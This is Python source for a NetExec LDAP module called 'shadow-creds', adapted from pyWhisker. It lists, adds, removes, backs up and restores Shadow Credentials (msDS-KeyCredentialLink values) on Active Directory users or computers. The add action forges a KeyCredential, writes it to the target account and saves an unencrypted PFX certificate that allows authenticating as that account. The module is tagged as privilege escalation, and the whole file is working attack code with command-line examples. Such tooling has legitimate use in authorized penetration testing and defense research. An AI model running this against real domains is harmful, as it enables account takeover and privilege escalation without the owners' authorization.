import json
from pathlib import Path

from cryptography.hazmat.primitives.serialization import NoEncryption
from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid
from impacket.ldap.ldap import MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE, LDAPSessionError

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.paths import NXC_PATH


class NXCModule:
    """
    Made by @NeffIsBack
    Heavily inspired by the pyWhisker project by Shutdown:
    https://github.com/ShutdownRepo/pywhisker
    """

    name = "shadow-creds"
    description = "List, add, inspect, remove, backup, or revert Shadow Credentials on a user or computer"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def options(self, context, module_options):
        """
        TARGET      sAMAccountName of the target user or computer (for example, TARGET=user or TARGET=DESKTOP-123456$)
        ACTION      Action to perform: list, add, info, remove, backup, or revert (default: list)
        DEVICE_ID   KeyCredential device ID; required for info and remove
        JSONFILE    JSON backup path; required for revert and optional for backup

        Examples:
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=list
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=add
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=info DEVICE_ID=<guid>
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=remove DEVICE_ID=<guid>
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=backup JSONFILE=shadow-creds.json
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=revert JSONFILE=shadow-creds.json
        """
        self.target = module_options.get("TARGET", "").strip()
        self.action = module_options.get("ACTION", "list").lower().strip()
        self.device_id = module_options.get("DEVICE_ID")
        self.jsonfile = module_options.get("JSONFILE")

        if not self.target:
            context.log.fail("TARGET is required")
            return False
        if self.action not in {"list", "add", "info", "remove", "backup", "revert"}:
            context.log.fail("ACTION must be one of: list, add, info, remove, backup, revert")
            return False
        if self.action in {"info", "remove"} and not self.device_id:
            context.log.fail(f"DEVICE_ID is required for ACTION={self.action}")
            return False
        if self.action == "revert" and not self.jsonfile:
            context.log.fail("JSONFILE is required for ACTION=revert")
            return False

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        resp = connection.search(
            searchFilter=f"(&(objectClass=user)(sAMAccountName={self.target}))",
            attributes=["distinguishedName", "sAMAccountName", "objectClass", "msDS-KeyCredentialLink"],
        )
        resp_parsed = parse_result_attributes(resp)
        if not resp_parsed:
            context.log.fail(f"Account '{self.target}' was not found")
            return

        target_dn = resp_parsed[0]["distinguishedName"]
        raw_values = resp_parsed[0].get("msDS-KeyCredentialLink", [])
        raw_values = raw_values if isinstance(raw_values, list) else [raw_values]

        if self.action == "list":
            self.list(self.parse_credentials(raw_values))
        elif self.action == "add":
            self.add(target_dn, "computer" in resp_parsed[0]["objectClass"])
        elif self.action == "info":
            self.info(self.parse_credentials(raw_values))
        elif self.action == "remove":
            self.remove(target_dn, self.parse_credentials(raw_values))
        elif self.action == "backup":
            self.backup(raw_values)
        elif self.action == "revert":
            self.revert(target_dn)

    def parse_credentials(self, raw_values):
        credentials = []
        for raw_value in raw_values:
            try:
                # AD stores each KeyCredential as a textual DN-Binary value.
                credentials.append(
                    (
                        raw_value,
                        KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(raw_value.encode())),
                    )
                )
            except Exception as e:
                self.context.log.fail(f"Could not parse an existing KeyCredential: {e}")
        return credentials

    def get_credential(self, credentials):
        for raw_value, credential in credentials:
            if credential.DeviceId and credential.DeviceId.toFormatD().lower() == self.device_id.lower():
                return raw_value, credential
        self.context.log.fail(f"No KeyCredential with device ID {self.device_id} was found on {self.target}")
        return None

    def list(self, credentials):
        if not credentials:
            self.context.log.display(f"No KeyCredentials found on {self.target}")
            return

        self.context.log.success(f"Found {len(credentials)} KeyCredential(s) on {self.target}")
        for _, credential in credentials:
            self.context.log.highlight(f"Device ID: {credential.DeviceId.toFormatD().lower() if credential.DeviceId else '<missing>'} | Creation time: {credential.CreationTime}")

    def add(self, target_dn, is_computer):
        try:
            certificate = X509Certificate2(subject=self.target, keySize=2048, notBefore=-(40 * 365), notAfter=40 * 365)
            credential = KeyCredential.fromX509Certificate2(
                certificate=certificate,
                deviceId=Guid(),
                owner=target_dn,
                currentTime=DateTime(),
                isComputerKey=is_computer,
            )
            device_id = credential.DeviceId.toFormatD().lower()
            ldap_value = credential.toDNWithBinary().toString()
            output_path = self.write_pfx(certificate, device_id)
        except Exception as e:
            self.context.log.fail(f"Failed to generate certificate and KeyCredential: {e}")
            return

        try:
            # Add one value instead of replacing the complete multi-valued attribute.
            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_ADD, [ldap_value])]})
        except LDAPSessionError as e:
            self.context.log.fail(f"Failed to add the KeyCredential: {e}")
            self.context.log.display(f"Generated PFX retained at {output_path}")
            return

        self.context.log.success(f"Added KeyCredential with device ID {device_id} to {self.target}")
        self.context.log.highlight(f"PFX: {output_path}")

    def write_pfx(self, certificate, device_id):
        output_dir = Path(NXC_PATH) / "modules" / "shadow-creds"
        output_dir.mkdir(parents=True, exist_ok=True)
        output_path = output_dir / f"{self.target.rstrip('$')}_{device_id}.pfx"

        output_path.write_bytes(
            serialize_key_and_certificates(
                name=self.target.encode("utf-8"),
                key=certificate.key.to_cryptography_key(),
                cert=certificate.certificate.to_cryptography(),
                cas=None,
                encryption_algorithm=NoEncryption(),
            )
        )
        return output_path

    def info(self, credentials):
        result = self.get_credential(credentials)
        if result is None:
            return

        _, credential = result
        self.context.log.success(f"KeyCredential {self.device_id} on {self.target}")
        for name, value in {
            "Owner": credential.Owner,
            "Device ID": credential.DeviceId.toFormatD().lower(),
            "Version": hex(credential.Version.value),
            "Key ID": credential.Identifier,
            "Key hash": credential.KeyHash.hex(),
            "Key size": getattr(credential.RawKeyMaterial, "keySize", "unknown"),
            "  Exponent (E)": credential.RawKeyMaterial.exponent,
            "  Modulus (N)": hex(credential.RawKeyMaterial.modulus),
            "  Prime 1 (P)": hex(credential.RawKeyMaterial.prime1),
            "  Prime 2 (Q)": hex(credential.RawKeyMaterial.prime2),
            "Usage": credential.Usage,
            "Legacy usage": credential.LegacyUsage,
            "Source": credential.Source,
            "Custom key info": credential.CustomKeyInfo,
            **{f"  {key}": custom_value for key, custom_value in credential.CustomKeyInfo.items()},
            "Last logon time": credential.LastLogonTime,
            "Creation time": credential.CreationTime,
        }.items():
            self.context.log.highlight(f"{name:<17} {value}")

    def remove(self, target_dn, credentials):
        result = self.get_credential(credentials)
        if result is None:
            return

        raw_value, _ = result
        try:
            # Delete the exact raw value so neighboring credentials remain untouched.
            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_DELETE, [raw_value])]})
        except LDAPSessionError as e:
            self.context.log.fail(f"Failed to remove the KeyCredential: {e}")
            return

        self.context.log.success(f"Removed KeyCredential {self.device_id} from {self.target}")

    def backup(self, raw_values):
        output_path = Path(self.jsonfile) if self.jsonfile else Path(NXC_PATH) / "modules" / "shadow-creds" / f"{self.target.rstrip('$')}.json"
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(json.dumps({"keyCredentials": raw_values}, indent=4), encoding="utf-8")
        self.context.log.success(f"Backed up {len(raw_values)} KeyCredential(s) from {self.target} to {output_path}")

    def revert(self, target_dn):
        try:
            key_credentials = []
            for key_credential in json.loads(Path(self.jsonfile).read_text(encoding="utf-8"))["keyCredentials"]:
                if not isinstance(key_credential, (dict, str)):
                    raise ValueError("keyCredentials entries must be objects or strings")
                key_credentials.append(KeyCredential.fromDict(key_credential).toDNWithBinary().toString() if isinstance(key_credential, dict) else key_credential)
        except Exception as e:
            self.context.log.fail(f"Failed to read Shadow Credentials backup: {e}")
            return

        try:
            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_REPLACE, key_credentials)]})
        except Exception as e:
            self.context.log.fail(f"Failed to revert Shadow Credentials: {e}")
            return
        self.context.log.success(f"Reverted {self.target} to {len(key_credentials)} backed-up KeyCredential(s)")
